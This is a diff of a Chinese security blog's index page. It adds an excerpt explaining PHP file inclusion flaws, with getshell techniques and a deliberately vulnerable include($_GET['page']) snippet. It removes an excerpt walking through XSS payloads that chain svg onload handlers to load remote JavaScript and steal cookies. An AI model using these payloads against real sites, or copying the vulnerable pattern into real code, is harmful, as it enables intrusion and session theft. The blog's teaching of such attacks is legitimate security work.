@@ -83,6 +83,65 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/file-include-vulnerabilities/">文件包含漏洞</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-07-26</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        0x00 文件包含 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。
+程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。
+几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多,而在JSP、ASP、ASP.NET程序中却非常少，甚至没有，这是有些语言设计的弊端。
+在PHP中经常出现包含漏洞，但这并不意味这其他语言不存在。
+0x01 常见文件包含函数 include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行 require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本 include_once()和require_once()：若文件中代码已被包含则不会再次包含  0x02 利用条件  程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件 用户能够控制该动态变量  注：PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析， 若文件内容不符合PHP语法规范则会暴漏其源码。包含不存在的文件则可能暴露路径  0x03 漏洞危害  执行任意代码 读取文件源码或敏感信息 包含恶意文件控制网站 甚至控制服务器  0x04 漏洞分类  本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码  读敏感文件，读PHP文件 包含日志文件GetShell 上传图片马，然后包含从而GetShell 包含/proc/self/envion文件GetShell 包含data:或php://input等伪协议 若有phpinfo则可以包含临时文件  远程文件包含：可以直接执行任意代码  要保证php.ini中allow_url_fopen和allow_url_include要为On   0x05 漏洞挖掘  上AWVS或者自己写代码测试
+ 0x06 本地包含GetShell  示例一  &lt;?php if (@$_GET['page']) { include($_GET['page']); } else { include &quot;show.php&quot;; } ?
+    </p>
+
+    
+    <footer>
+        <a href="/posts/file-include-vulnerabilities/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/php-deserialization-vulnerabilities/">PHP反序列化漏洞</a></h2>
 
         
@@ -574,58 +633,6 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/xss-example/">XSS实例</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-07-17</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/xss">xss</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-         首先感谢凯神的指导
-0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
-&lt;script&gt;alert(1)&lt;/script&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a  但是这个要在点击删除时payload才起作用 也可用&lt;img src=1 onerror=alert(1) /&gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement('script'); a.src=&quot;www.xxx.com&quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement('script');/* */a.src=&quot;www.xxx.com&quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &lt;svg/onload=&quot;b='http://t.i'&quot;&gt; &lt;svg/onload=&quot;b+='m/16ap6'&quot;&gt; &lt;svg/onload=&quot;$loadJs(b)&quot;&gt;  0x04 得到Cookie 
-    </p>
-
-    
-</article>
-
-
-            
 
             
 
@@ -668,9 +675,9 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/other" title="other">other(13)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(67)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/pentest" title="pentest">pentest(68)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(11)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(12)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python(35)</a></li>
         
@@ -747,7 +754,7 @@ Reference(侵删)：  http://navisec.it/编辑器漏洞手册/
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/injection" title="injection">injection</a>
-                <sup>11</sup>
+                <sup>12</sup>
             </p>
         
             <p style="display:inline-block;">
